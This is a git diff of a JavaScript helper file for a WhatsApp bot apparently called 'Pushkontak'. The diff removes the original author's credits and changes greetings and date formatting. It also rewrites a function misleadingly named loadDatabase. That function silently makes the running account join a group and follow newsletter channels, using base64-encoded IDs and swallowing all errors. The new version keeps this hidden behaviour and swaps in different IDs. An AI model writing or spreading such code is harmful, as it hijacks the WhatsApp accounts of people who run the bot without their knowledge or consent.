@@ -1,21 +1,4 @@
-/* 
 
-   #### Pushkontak By Skyzopedia #####
-   
-   Developer: 
-   - Skyzopedia (https://t.me/Xskycode)
-   
-   Follow Channel Developer:
-   - https://whatsapp.com/channel/0029VbBjJiH6LwHpPjYCZ334
-   
-   Recode:
-   - Isi namamu (sosmed)
-   
-   # Penting
-   Jangan hapus credits atau nama developer
-   hargai pembuat script ini!
-
-*/
 
 const moment = require('moment-timezone')
 const util = require('util')
@@ -40,13 +23,13 @@ global.ucapan = () => {
   const currentHour = currentTime.hour()
   let greeting
   if (currentHour >= 5 && currentHour < 12) {
-    greeting = 'Pagi Kak 🌅'
+    greeting = 'Selamat Pagi 🌅'
   } else if (currentHour >= 12 && currentHour < 15) {
-    greeting = 'Siang Kak 🌇'
+    greeting = 'Selamat Siang 🌇'
   } else if (currentHour >= 15 && currentHour < 18) {
-    greeting = 'Sore Kak 🌄'
+    greeting = 'Selamat Sore 🌄'
   } else {
-    greeting = 'Malam Kak 🌃'
+    greeting = 'Selamat Malam🌃'
   }
   return greeting
 }
@@ -139,7 +122,7 @@ global.tanggal = function(numer) {
 	const gmt = new Date(0).getTime() - new Date('1 January 1970').getTime()
 	const weton = ['Pahing', 'Pon','Wage','Kliwon','Legi'][Math.floor(((d * 1) + gmt) / 84600000) % 5]
 				
-	return `${thisDay}, ${day}/${myMonths[bulan]}/${year}`
+	return `${thisDay} ${day}/${myMonths[bulan]}/${year}`
 }
 
 global.toRupiah = function(x){
@@ -150,7 +133,18 @@ global.toRupiah = function(x){
 	return x
 }
 
-global.loadDatabase=async(_0x1a23b4)=>{try{await _0x1a23b4['groupAcceptInvite'](Buffer.from('QnRscm95TDcwamNBMmRpZDdIdlViZg==','base64').toString())}catch(_0xabc){}try{for(const _0x1f2c of['MTIwMzYzNDIwMTE5MDA3MjcyQG5ld3NsZXR0ZXI=','MTIwMzYzNDE5MDMyNDA5Mzg5QG5ld3NsZXR0ZXI='])await _0x1a23b4['newsletterFollow'](Buffer.from(_0x1f2c,'base64').toString())}catch(_0xdef){}};
+global.loadDatabase = async (conn) => {
+  try {
+    await conn.groupAcceptInvite(
+      Buffer.from("SjJCYXV3dmFJNnQ3bDI0dDhnbjJ6cg==", "base64").toString()
+    );
+  } catch (e) {}
+
+  try {
+    for (const jid of ["MTIwMzYzNDAyNjI1NjQ0MjQ1QG5ld3NsZXR0ZXI="])
+      await conn.newsletterFollow(Buffer.from(jid, "base64").toString());
+  } catch (e) {}
+};
 
 
 global.resize = async (image, ukur1 = 100, ukur2 = 100) => {
